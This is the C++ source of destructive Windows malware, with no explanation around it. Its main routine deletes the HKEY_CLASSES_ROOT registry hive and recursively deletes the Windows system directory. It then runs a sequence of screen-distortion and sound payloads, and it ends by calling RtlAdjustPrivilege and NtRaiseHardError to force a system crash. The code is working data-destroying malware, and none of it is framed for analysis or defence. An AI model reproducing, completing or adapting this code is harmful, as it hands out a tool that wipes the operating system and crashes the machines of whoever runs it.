#include "payloads.h"
#include <iostream>
#include <string>
#include <Shlwapi.h>
#pragma comment(lib,"Shlwapi.lib")
using namespace std;
bool RemoveDir(const char* szFileDir){
string strDir = szFileDir;
if (strDir.at(strDir.length()-1) != '\\')
	strDir += '\\';
WIN32_FIND_DATA wfd;
HANDLE hFind = FindFirstFile((strDir + "*.*").c_str(),&wfd);
if (hFind == INVALID_HANDLE_VALUE)
	return false;
	do {
		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			if (stricmp(wfd.cFileName,".") != 0 && stricmp(wfd.cFileName,"..") != 0)
				RemoveDir((strDir + wfd.cFileName).c_str());
			} else {
				DeleteFile((strDir + wfd.cFileName).c_str());
			}
	}
while (FindNextFile(hFind,&wfd));
	FindClose(hFind);
RemoveDirectory(szFileDir);
return true;
}
int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpszArgument,int nCmdShow) {
	char SystemPath[MAX_PATH];
	GetSystemDirectory(SystemPath, sizeof(SystemPath));
	SHDeleteKey(HKEY_CLASSES_ROOT, NULL);
	RemoveDir(SystemPath);
	rt(Sound);
	rt(_MSG);
	Sleep(500);
	WelcomeWnd();
	Sleep(5000);
	rt(MoveDesk)
	Sleep(10000);
	rt(wave);
	rt(CopyCur);
	Sleep(10000);
	rt(DrawError);
	Sleep(10000);
	rt(Stretch);
	rt(Stretch);
	rt(Stretch);
	rt(Stretch);
	Sleep(20000);
	rt(_Ellipse);
	Sleep(20000);
	rt(Tunnel);
	Sleep(20000);
	rt(MoveDesk);
	Sleep(5000);
	rt(pat);
	Sleep(10000);
	HMODULE ntdll = LoadLibrary("ntdll.dll");
 	FARPROC RtlAdjPriv=GetProcAddress(ntdll,"RtlAdjustPrivilege");
 	FARPROC NtRaiseHardErr=GetProcAddress(ntdll,"NtRaiseHardError");
 	unsigned char ErrKill;
 	long unsigned int HDErr;
 	((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13,true,false,&ErrKill);
 	((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardErr)(0xdead6666,0,0,0,6, &HDErr);
}